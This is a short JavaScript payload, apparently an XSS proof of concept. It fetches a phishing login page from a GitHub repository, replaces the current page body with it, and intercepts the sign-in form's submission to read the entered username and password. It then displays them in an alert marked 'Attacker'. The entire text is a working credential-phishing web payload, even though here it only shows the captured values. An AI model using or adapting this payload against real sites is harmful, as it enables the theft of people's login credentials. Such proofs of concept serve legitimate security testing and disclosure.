fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/login-phishing-page/login.html").then(res=>res.text()).then(res => {
  document.body.innerHTML = res;

  const form = document.querySelector('#sign-in-form');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let user = document.querySelector('#username-1').innerText
    let pass = document.querySelector('#react-aria-1').value
    alert('====>[ Attacker ]<====\n[+]=> Your email: ' + user + "\n[+]=> Your password: " + pass);

    return;
  }, true);
})
